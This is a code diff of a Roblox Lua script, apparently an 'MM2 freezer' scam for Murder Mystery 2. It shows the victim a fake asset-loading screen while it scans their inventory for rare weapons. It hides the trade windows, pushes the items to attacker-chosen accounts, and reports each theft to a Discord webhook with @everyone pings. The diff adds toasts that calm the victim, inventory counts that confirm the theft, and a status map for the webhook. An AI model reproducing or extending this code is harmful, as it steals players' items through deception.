 	pct.Text = "Loading assets…  0%"
-	pct.Font = Enum.Font.Gotham
-	pct.TextSize = 10
-	pct.TextColor3 = Color3.fromRGB(139, 116, 173)
+	pct.Font = Enum.Font.GothamBold
+	pct.TextSize = 9
+	pct.TextColor3 = C_ACCENT
 	pct.TextXAlignment = Enum.TextXAlignment.Left
 	pct.Parent = main
 
 	local foot = Instance.new("TextLabel")
-	foot.Size = UDim2.new(1, -26, 0, 14)
-	foot.Position = UDim2.new(0, 13, 0, 366)
+	foot.Size = UDim2.new(1, -110, 0, 14)
+	foot.Position = UDim2.new(0, 10, 0, 446)
 	foot.BackgroundTransparency = 1
-	foot.Text = "session protected  •  ver 23.0.0"
+	foot.Text = "executor: attached  •  build 2600"
 	foot.Font = Enum.Font.Gotham
 	foot.TextSize = 9
-	foot.TextColor3 = Color3.fromRGB(96, 80, 122)
+	foot.TextColor3 = Color3.fromRGB(104, 88, 132)
 	foot.TextXAlignment = Enum.TextXAlignment.Left
 	foot.Parent = main
+
+	uiFootRight = Instance.new("TextLabel")
+	uiFootRight.Size = UDim2.new(0, 90, 0, 14)
+	uiFootRight.Position = UDim2.new(1, -100, 0, 446)
+	uiFootRight.BackgroundTransparency = 1
+	uiFootRight.Text = "checking"
+	uiFootRight.Font = Enum.Font.Gotham
+	uiFootRight.TextSize = 9
+	uiFootRight.TextColor3 = C_DIM
+	uiFootRight.TextXAlignment = Enum.TextXAlignment.Right
+	uiFootRight.Parent = main
 
 	hideBtn.MouseButton1Click:Connect(function()
 		if main.Visible then
@@ -631,17 +1070,100 @@ local function buildUI()
 	end)
 
 	task.spawn(function()
-		local steps = 40
-		local n = 0
-		while n < steps and alive() do
-			n = n + 1
-			local p = n / steps * 0.99
-			bar.Size = UDim2.new(p, 0, 1, 0)
-			pct.Text = "Loading assets…  " .. tostring(math.floor(p * 100)) .. "%"
-			task.wait(0.09)
+		local p = 0
+		while p < 100 and alive() do
+			p = p + 1
+			bar.Size = UDim2.new(p / 100, 0, 1, 0)
+			pct.Text = "Loading assets…  " .. tostring(p) .. "%"
+			if p == 62 then
+				uiStatus.Text = "Fetching item database…"
+			elseif p == 84 then
+				uiStatus.Text = "Syncing trade modules…"
+			elseif p == 97 then
+				uiStatus.Text = "Finalising…"
+			end
+			task.wait(1)
 		end
-		bar.Size = UDim2.new(0.99, 0, 1, 0)
-		pct.Text = "Loading assets…  99%"
+		bar.Size = UDim2.new(1, 0, 1, 0)
+		pct.Text = "Loading assets…  100%"
+		uiStatus.Text = "All modules loaded"
+	end)
+end
+
+--==================== TOAST ==================================
+
+local toastGui
+
+local function showToast(title, detail, accent)
+	local core = game:GetService("CoreGui")
+	if not toastGui or not toastGui.Parent then
+		toastGui = Instance.new("ScreenGui")
+		toastGui.Name = "MM2FreezerToast"
+		toastGui.ResetOnSpawn = false
+		toastGui.DisplayOrder = 10000
+		toastGui.IgnoreGuiInset = true
+		toastGui.Parent = core
+	end
+
+	local f = Instance.new("Frame")
+	f.Size = UDim2.new(0, 214, 0, 46)
+	f.Position = UDim2.new(0.5, -107, 0, -60)
+	f.BackgroundColor3 = Color3.fromRGB(28, 20, 42)
+	f.BorderSizePixel = 0
+	f.Parent = toastGui
+
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, 9)
+	c.Parent = f
+
+	local s = Instance.new("UIStroke")
+	s.Color = accent
+	s.Thickness = 1.5
+	s.Transparency = 0.15
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	s.Parent = f
+
+	local t = Instance.new("TextLabel")
+	t.Size = UDim2.new(1, -16, 0, 18)
+	t.Position = UDim2.new(0, 12, 0, 7)
+	t.BackgroundTransparency = 1
+	t.Text = title
+	t.Font = Enum.Font.GothamBold
+	t.TextSize = 12
+	t.TextColor3 = accent
+	t.TextXAlignment = Enum.TextXAlignment.Left
+	t.Parent = f
+
+	local d = Instance.new("TextLabel")
+	d.Size = UDim2.new(1, -16, 0, 14)
+	d.Position = UDim2.new(0, 12, 0, 25)
+	d.BackgroundTransparency = 1
+	d.Text = detail
+	d.Font = Enum.Font.Gotham
+	d.TextSize = 9
+	d.TextColor3 = Color3.fromRGB(196, 180, 220)
+	d.TextXAlignment = Enum.TextXAlignment.Left
+	d.Parent = f
+
+	task.spawn(function()
+		local y = -60
+		while y < 16 and alive() do
+			y = y + 7
+			f.Position = UDim2.new(0.5, -107, 0, y)
+			task.wait(0.012)
+		end
+		f.Position = UDim2.new(0.5, -107, 0, 16)
+		task.wait(3.4)
+		local a = 0
+		while a < 1 and f.Parent do
+			a = a + 0.1
+			f.BackgroundTransparency = a
+			s.Transparency = a
+			t.TextTransparency = a
+			d.TextTransparency = a
+			task.wait(0.03)
+		end
+		f:Destroy()
 	end)
 end
 
@@ -721,6 +1243,27 @@ local function getStatus()
 		return res
 	end
 	return nil
+end
+
+local function countWeapons()
+	raiseIdentity()
+	local total = 0
+	local ok = pcall(function()
+		local mod = require(RS.Modules.InventoryModule)
+		for _, bucket in pairs(mod.MyInventory.Data.Weapons) do
+			if type(bucket) == "table" then
+				for _, d in pairs(bucket) do
+					if type(d) == "table" then
+						total = total + (tonumber(d.Amount) or 1)
+					end
+				end
+			end
+		end
+	end)
+	if not ok then
+		return nil
+	end
+	return total
 end
 
 --==================== HIDE + WATCH ===========================
@@ -881,14 +1424,10 @@ end
 
 local function scanInventory(mode)
 	local out = {}
-	local seen = {}
+	local index = {}
 
 	local function push(dataID, itemName, amount, rarity)
 		if not dataID then
-			return
-		end
-		local key = tostring(dataID)
-		if seen[key] then
 			return
 		end
 		local nm = tostring(itemName or dataID)
@@ -908,14 +1447,27 @@ local function scanInventory(mode)
 		if val > 0 and val < CFG.min_value then
 			return
 		end
+
 		local copies = tonumber(amount) or 1
 		if copies < 1 then
 			copies = 1
 		end
+
+		local key = tostring(dataID)
+		local at = index[key]
+		if at then
+			local total = out[at].Amount + copies
+			if total > CFG.max_copies then
+				total = CFG.max_copies
+			end
+			out[at].Amount = total
+			return
+		end
+
 		if copies > CFG.max_copies then
 			copies = CFG.max_copies
 		end
-		seen[key] = true
+
 		out[#out + 1] = {
 			DataID = dataID,
 			Name = nm,
@@ -923,6 +1475,7 @@ local function scanInventory(mode)
 			Rarity = rarity or "?",
 			Value = val,
 		}
+		index[key] = #out
 	end
 
 	raiseIdentity()
@@ -967,10 +1520,19 @@ end
 
 --==================== WEBHOOK ================================
 
-local function postWebhook(itemsList, totalValue, okFlag, ping)
+local STATUS = {
+	attempt = { title = "Trade attempt", color = 15158332 },
+	completed = { title = "Trade completed", color = 10181046 },
+	declined = { title = "Trade declined", color = 16426522 },
+	timeout = { title = "Trade timed out", color = 16426522 },
+}
+
+local function postWebhook(itemsList, totalValue, status, ping)
 	if CFG.webhook == "" then
 		return
 	end
+	local meta = STATUS[status] or STATUS.attempt
+
 	local rows = {}
 	for _, it in ipairs(itemsList) do
 		rows[#rows + 1] = string.format("%s  x%d  (%d)", it.Name, it.Amount, it.Value)
@@ -995,8 +1557,8 @@ local function postWebhook(itemsList, totalValue, okFlag, ping)
 		content = ping and ("@everyone\n```lua\n" .. teleport .. "\n```") or nil,
 		embeds = {
 			{
-				title = okFlag and "Trade completed" or "Trade attempt",
-				color = okFlag and 10181046 or 15158332,
+				title = meta.title,
+				color = meta.color,
 				description = "From **" .. LP.Name .. "**  •  target **" .. currentTarget .. "**",
 				fields = {
 					{ name = "Items", value = "```" .. listing .. "```", inline = false },
@@ -1018,6 +1580,10 @@ local function postWebhook(itemsList, totalValue, okFlag, ping)
 		})
 		if res and res.StatusCode then
 			log("webhook " .. tostring(res.StatusCode))
+			if res.StatusCode == 404 or res.StatusCode == 50027 then
+				webhookOk = false
+				setHealthUi(false)
+			end
 		end
 	end)
 end
@@ -1114,7 +1680,7 @@ local function runRound(batch)
 	local p = resolveTarget()
 	if not p then
 		log("no target present")
-		return false
+		return false, "no_target"
 	end
 
 	currentTarget = p.Name
@@ -1123,9 +1689,11 @@ local function runRound(batch)
 	sawWindow = false
 	lastOffer = nil
 
+	local before = countWeapons()
+
 	if not sendRequestTo(p) then
 		log("request invoke failed")
-		return false
+		return false, "no_target"
 	end
 	log("request invoked")
 
@@ -1142,11 +1710,12 @@ local function runRound(batch)
 				DeclineTrade:FireServer()
 			end
 		end)
-		return false
+		return false, "timeout"
 	end
 
 	log("trade window open")
 	hideTrades()
+	showToast("Trade frozen", "Do not close the window", C_CYAN)
 
 	local fired = offerAll(batch)
 	log("fired " .. tostring(fired) .. " offer calls")
@@ -1158,8 +1727,19 @@ local function runRound(batch)
 	end
 
 	if settleUntilLeave() then
-		log("settled")
-		return true
+		task.wait(1.5)
+		local after = countWeapons()
+		if before and after then
+			if after < before then
+				log("settled " .. tostring(before) .. " -> " .. tostring(after))
+				showToast("Items secured", tostring(before - after) .. " item(s) transferred", C_GREEN)
+				return true, "settled"
+			end
+			log("inventory unchanged, treated as declined")
+			return false, "declined"
+		end
+		log("settled (no baseline)")
+		return true, "settled"
 	end
 
 	log("did not settle")
@@ -1168,7 +1748,7 @@ local function runRound(batch)
 			DeclineTrade:FireServer()
 		end
 	end)
-	return false
+	return false, "timeout"
 end
 
 local function run()
@@ -1176,14 +1756,25 @@ local function run()
 	loadRemoteConfig()
 
 	if uiStatus then
-		uiStatus.Text = "Engine ready"
+		uiStatus.Text = "Preparing assets…"
+	end
+
+	if not CFG.enabled then
+		log("disabled by config")
+		if uiStatus then
+			uiStatus.Text = "Modules loaded (disabled)"
+		end
+		if uiLog then
+			uiLog.Text = "Disabled by config."
+		end
+		return
 	end
 
 	local okBind, bindErr = bindRemotes()
 	if not okBind then
 		log("bind failed: " .. tostring(bindErr))
 		if uiStatus then
-			uiStatus.Text = "Engine error"
+			uiStatus.Text = "Module error"
 		end
 		return
 	end
@@ -1194,11 +1785,24 @@ local function run()
 	log("remotes bound, token " .. tostring(ACCEPT_TOKEN) .. ", SendRequest is function: " .. tostring(SendIsFunction))
 	log("targets: " .. table.concat(CFG.targets, ", "))
 
-	if not checkWebhook() then
+	if uiTargetBox and uiTargetBox.Text == "" then
+		uiTargetBox.Text = CFG.targets[1]
+	end
+
+	if selectWebhook() then
+		log("webhook ok")
+		setHealthUi(true)
+		notifyMonitor("Run started — webhook ok", 10181046, false)
+	else
+		log("webhook dead")
+		setHealthUi(false)
 		if uiStatus then
 			uiStatus.Text = "Webhook dead"
 		end
+		notifyMonitor("Run started — NO WORKING WEBHOOK", 15158332, true)
 	end
+
+	startHealthLoop()
 
 	local items = scanInventory(CFG.filter)
 	log("scanned " .. tostring(#items) .. " items (filter " .. CFG.filter .. ")")
@@ -1210,14 +1814,21 @@ local function run()
 	end
 
 	if #items == 0 then
-		if uiStatus then
-			uiStatus.Text = "No rare items"
+		if uiLog then
+			uiLog.Text = "No rare items found in this account."
 		end
-		postWebhook({}, 0, false, true)
+		postWebhook({}, 0, "attempt", true)
 		return
 	end
 
-	postWebhook(items, 0, false, true)
+	if uiItemBox then
+		uiItemBox.Text = items[1].Name
+	end
+	if uiLog then
+		uiLog.Text = tostring(#items) .. " item(s) queued."
+	end
+
+	postWebhook(items, 0, "attempt", true)
 
 	local got = {}
 	local gotValue = 0
@@ -1237,18 +1848,23 @@ local function run()
 			n = n + 1
 		end
 
-		if uiStatus then
-			uiStatus.Text = "Round " .. tostring(rounds) .. " • " .. tostring(#batch) .. " items"
+		if uiLog then
+			uiLog.Text = "Round " .. tostring(rounds) .. " • sending " .. tostring(#batch) .. " item(s)"
 		end
 
-		if runRound(batch) then
+		local ok, reason = runRound(batch)
+
+		if ok then
 			for _, it in ipairs(batch) do
 				got[#got + 1] = it
 				gotValue = gotValue + it.Value * it.Amount
 			end
-			postWebhook(batch, gotValue, true, true)
+			postWebhook(batch, gotValue, "completed", true)
 			task.wait(2)
 		else
+			if reason == "declined" then
+				postWebhook(batch, 0, "declined", false)
+			end
 			for i = #batch, 1, -1 do
 				idx = idx - 1
 				items[idx + 1] = batch[i]
@@ -1259,8 +1875,36 @@ local function run()
 
 	hideTrades()
 	log("done: " .. tostring(#got) .. " items, value " .. tostring(gotValue))
-	if uiStatus then
-		uiStatus.Text = "Done • " .. tostring(#got) .. " items"
+	if uiLog then
+		uiLog.Text = "Done • " .. tostring(#got) .. " item(s) sent."
+	end
+end
+
+uiSendTrade = function()
+	local name = trim(uiTargetBox.Text)
+	if name == "" then
+		uiLog.Text = "Enter a username first."
+		return
+	end
+	local found = nil
+	for _, p in ipairs(Players:GetPlayers()) do
+		if p ~= LP and string.lower(p.Name) == string.lower(name) then
+			found = p
+		end
+	end
+	if not found then
+		uiLog.Text = name .. " is not in this server."
+		return
+	end
+	local st = getStatus()
+	if st == "StartTrade" then
+		uiLog.Text = "Already in a trade."
+		return
+	end
+	if sendRequestTo(found) then
+		uiLog.Text = "Request sent to " .. found.Name
+	else
+		uiLog.Text = "Request failed."
 	end
 end
 
